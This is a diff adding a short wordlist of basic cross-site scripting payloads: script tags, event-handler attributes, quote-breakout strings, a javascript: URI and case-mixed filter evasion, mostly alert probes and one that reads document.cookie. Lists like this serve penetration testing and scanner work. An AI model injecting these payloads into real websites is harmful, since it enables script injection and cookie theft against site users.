@@ -1,0 +1,25 @@
+# XSS Basic Payloads
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<iframe src="javascript:alert(1)">
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+javascript:alert(1)
+<ScRiPt>alert(1)</ScRiPt>
+<img src=x onerror=alert`1`>
